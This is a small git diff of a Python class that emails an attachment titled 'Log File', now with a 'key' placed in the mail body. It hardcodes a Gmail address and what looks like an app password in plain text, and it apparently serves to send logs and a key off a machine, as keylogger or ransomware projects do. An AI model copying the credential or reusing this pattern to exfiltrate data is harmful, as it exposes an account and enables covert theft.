@@ -5,12 +5,11 @@ from email import encoders
 import smtplib
 
 class EmailSender:
-    def __init__(self, email_address, password, toaddress):
+    def __init__(self, email_address, password, to_address):
         self.email_address = "vikramathithyan99@gmail.com"
         self.password = "jguinpzxcwsksieu"
-        self.toaddress = "suriyaseyon6@gmail.com"
 
-    def send_mail(self, filename, attachment, toaddr):
+    def send_mail(self, filename, attachment, toaddr, key):
         fromaddr = self.email_address
 
         msg = MIMEMultipart()
@@ -19,7 +18,7 @@ class EmailSender:
         msg['To'] = toaddr
         msg['Subject'] = "Log File"
 
-        body = "Body_of_the_mail"
+        body = key
         msg.attach(MIMEText(body, 'plain'))
 
         attachment_file = open(attachment, 'rb')
